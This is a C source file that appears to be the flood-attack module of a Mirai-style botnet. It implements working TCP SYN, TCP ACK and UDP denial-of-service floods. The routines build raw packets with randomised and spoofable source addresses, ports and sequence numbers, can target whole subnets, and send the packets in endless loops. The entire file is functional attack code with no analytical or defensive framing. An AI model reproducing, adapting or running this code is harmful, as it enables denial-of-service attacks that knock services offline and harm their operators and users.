#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "util.h"
#include "attack.h"
#include "rand.h"
#include "methods.h"

#define PROTO_TCP_OPT_NOP   1
#define PROTO_TCP_OPT_MSS   2
#define PROTO_TCP_OPT_WSS   3
#define PROTO_TCP_OPT_SACK  4
#define PROTO_TCP_OPT_TSVAL 8

static unsigned short csum(unsigned short *, int);
static uint16_t checksum_generic(uint16_t *, uint32_t);
static uint16_t checksum_tcpudp(struct iphdr *, void *, uint16_t, int);
static uint32_t get_dns_resolver(void);

void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    char dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 1);
    uint16_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    char urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, 0);
    char ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, 0);
    char psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, 0);
    char rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, 0);
    char syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, 1);
    char fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, 0);
    uint32_t source_ip = util_local_addr();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }

    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    struct syn_packet {
        char *pkt;
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
    };

    struct syn_packet *packet;
    packet = (struct syn_packet *)calloc(10, sizeof(struct syn_packet));

    for (i = 0; i < 10; i++)
    {
        packet[i].pkt = calloc(128, sizeof (char));
        packet[i].iph = (struct iphdr *)packet[i].pkt;
        packet[i].tcph = (struct tcphdr *)(packet[i].iph + 1);
        packet[i].opts = (uint8_t *)(packet[i].tcph + 1);

        packet[i].iph->version = 4;
        packet[i].iph->ihl = 5;
        packet[i].iph->tos = ip_tos;
        packet[i].iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        packet[i].iph->id = htons(ip_ident);
        packet[i].iph->ttl = ip_ttl;
        if (dont_frag)
            packet[i].iph->frag_off = htons(1 << 14);
        packet[i].iph->protocol = IPPROTO_TCP;
        packet[i].iph->saddr = source_ip;
        packet[i].iph->daddr = targs[0].addr;

        packet[i].tcph->source = htons(sport);
        packet[i].tcph->dest = htons(dport);
        packet[i].tcph->seq = htons(seq);
        packet[i].tcph->doff = 10;
        packet[i].tcph->urg = urg_fl;
        packet[i].tcph->ack = ack_fl;
        packet[i].tcph->psh = psh_fl;
        packet[i].tcph->rst = rst_fl;
        packet[i].tcph->syn = syn_fl;
        packet[i].tcph->fin = fin_fl;

        *packet[i].opts++ = PROTO_TCP_OPT_MSS;
        *packet[i].opts++ = 4;
        *packet[i].opts = htons(1400 + (rand_real() & 0x0f));
        packet[i].opts += sizeof (uint16_t);
        *packet[i].opts++ = PROTO_TCP_OPT_SACK;
        *packet[i].opts++ = 2;
        *packet[i].opts++ = PROTO_TCP_OPT_TSVAL;
        *packet[i].opts++ = 10;
        *packet[i].opts = rand_real();
        packet[i].opts += sizeof (uint32_t);
        *packet[i].opts = 0;
        packet[i].opts += sizeof (uint32_t);
        *packet[i].opts++ = 1;
        *packet[i].opts++ = 3;
        *packet[i].opts++ = PROTO_TCP_OPT_WSS;
        *packet[i].opts++ = 6;

        if (source_ip == 0xffffffff)
            packet[i].iph->saddr = rand_real();
        if (ip_ident == 0xffff)
            packet[i].iph->id = rand_real() & 0xffff;
        if (sport == 0xffff)
            packet[i].tcph->source = rand_real() & 0xffff;
        if (dport == 0xffff)
            packet[i].tcph->dest = rand_real() & 0xffff;
        if (seq == 0xffff)
            packet[i].tcph->seq = rand_real();
        if (ack == 0xffff)
            packet[i].tcph->ack_seq = rand_real();
        if (urg_fl)
            packet[i].tcph->urg_ptr = rand_real() & 0xffff;

        packet[i].iph->check = 0;
        packet[i].iph->check = checksum_generic((uint16_t *)packet[i].iph, sizeof (struct iphdr));

        packet[i].tcph->check = 0;
        packet[i].tcph->check = checksum_tcpudp(packet[i].iph, packet[i].tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
    }

    while (1)
    {
        for (i = 0; i < targs_len; i++)
        {
            int rnd_packet;
            rnd_packet = rand_real() % 10;

            targs[0].sock_addr.sin_port = packet[rnd_packet].tcph->dest;
            sendto(fd, packet[rnd_packet].pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 128);
    char data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 0);
    struct sockaddr_in bind_addr = {0};
    char *data = calloc(data_len, sizeof(char));

    if (sport == 0xffff)
    {
        sport = rand_real();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_real();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_real()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

    if (data_rand)
        rand_packet(data, data_len);

    while (1)
    {
        for (i = 0; i < targs_len; i++)
            send(fds[i], data, data_len, MSG_NOSIGNAL);
    }
}

void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("[attack] starting flood udp\n");
#endif

    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    char dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 0);
    uint16_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    char data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    uint32_t source_ip = util_local_addr();

    if (data_len > 1460)
        data_len = 1460;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    struct udp_packet {
        char *pkt;
        char *data;
        struct iphdr *iph;
        struct udphdr *udph;
    };

    struct udp_packet *packet;
    packet = (struct udp_packet *)calloc(10, sizeof(struct udp_packet));

    for (i = 0; i < 10; i++)
    {
        packet[i].pkt = calloc(1510, sizeof (char));
        packet[i].iph = (struct iphdr *)packet[i].pkt;
        packet[i].udph = (struct udphdr *)(packet[i].iph + 1);

        packet[i].iph->version = 4;
        packet[i].iph->ihl = 5;
        packet[i].iph->tos = ip_tos;
        packet[i].iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        packet[i].iph->id = htons(ip_ident);
        packet[i].iph->ttl = ip_ttl;
        if (dont_frag)
            packet[i].iph->frag_off = htons(1 << 14);
        packet[i].iph->protocol = IPPROTO_UDP;
        packet[i].iph->saddr = source_ip;
        packet[i].iph->daddr = targs[0].addr;

        packet[i].udph->source = htons(sport);
        packet[i].udph->dest = htons(dport);
        packet[i].udph->len = htons(sizeof (struct udphdr) + data_len);
        packet[i].data = malloc(sizeof((char *)(packet[i].udph + 1)));
        packet[i].data = (char *)(packet[i].udph + 1);

        if (source_ip == 0xffffffff)
            packet[i].iph->saddr = rand_real();
        if (ip_ident == 0xffff)
            packet[i].iph->id = (uint16_t)rand_real();
        if (sport == 0xffff)
            packet[i].udph->source = rand_real();
        if (dport == 0xffff)
            packet[i].udph->dest = rand_real();

        if (data_rand)
            rand_packet(packet[i].data, data_len);

        packet[i].iph->check = 0;
        packet[i].iph->check = checksum_generic((uint16_t *)packet[i].iph, sizeof (struct iphdr));

        packet[i].udph->check = 0;
        packet[i].udph->check = checksum_tcpudp(packet[i].iph, packet[i].udph, packet[i].udph->len, sizeof (struct udphdr) + data_len);
    }

    while (1)
    {
        for (i = 0; i < targs_len; i++)
        {
            int rnd_packet;
            rnd_packet = rand_real() % 10;

            targs[0].sock_addr.sin_port = packet[rnd_packet].udph->dest;
            sendto(fd, packet[rnd_packet].pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    char dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 0);
    uint16_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    char urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, 0);
    char ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, 1);
    char psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, 0);
    char rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, 0);
    char syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, 0);
    char fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, 0);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    char data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);
    uint32_t source_ip = util_local_addr();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    struct ack_packet {
        char *pkt;
        char *payload;
        struct iphdr *iph;
        struct tcphdr *tcph;
    };

    struct ack_packet *packet;
    packet = (struct ack_packet *)calloc(10, sizeof(struct ack_packet));

    for (i = 0; i < 10; i++)
    {
        packet[i].payload = calloc(data_len, sizeof(char));
        packet[i].pkt = calloc(1510, sizeof (char));
        packet[i].iph = (struct iphdr *)packet[i].pkt;
        packet[i].tcph = (struct tcphdr *)(packet[i].iph + 1);
        packet[i].payload = (char *)(packet[i].tcph + 1);

        packet[i].iph->version = 4;
        packet[i].iph->ihl = 5;
        packet[i].iph->tos = ip_tos;
        packet[i].iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        packet[i].iph->id = htons(ip_ident);
        packet[i].iph->ttl = ip_ttl;
        if (dont_frag)
            packet[i].iph->frag_off = htons(1 << 14);
        packet[i].iph->protocol = IPPROTO_TCP;
        packet[i].iph->saddr = source_ip;
        packet[i].iph->daddr = targs[0].addr;

        packet[i].tcph->source = htons(sport);
        packet[i].tcph->dest = htons(dport);
        packet[i].tcph->seq = htons(seq);
        packet[i].tcph->doff = 5;
        packet[i].tcph->urg = urg_fl;
        packet[i].tcph->ack = ack_fl;
        packet[i].tcph->psh = psh_fl;
        packet[i].tcph->rst = rst_fl;
        packet[i].tcph->syn = syn_fl;
        packet[i].tcph->fin = fin_fl;
        packet[i].tcph->window = rand_real() & 0xffff;
        if (psh_fl)
            packet[i].tcph->psh = 1;

        rand_packet(packet[i].payload, data_len);

        packet[i].iph->check = 0;
        packet[i].iph->check = checksum_generic((uint16_t *)packet[i].iph, sizeof (struct iphdr));

        packet[i].tcph->check = 0;
        packet[i].tcph->check = checksum_tcpudp(packet[i].iph, packet[i].tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
    }

#ifdef BENCH
    int packets = 0;
    printf("[packets] finnished setting up packets\n");
#endif

    while (1)
    {
        for (i = 0; i < targs_len; i++)
        {
            int rnd_packet;
            rnd_packet = rand_real() % 10;

            targs[0].sock_addr.sin_port = packet[rnd_packet].tcph->dest;
            sendto(fd, packet[rnd_packet].pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in));
#ifdef BENCH
            printf("%d packets sent\n", packets++);
#endif
        }
    }
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;

    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

static unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum = 0;
    for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}
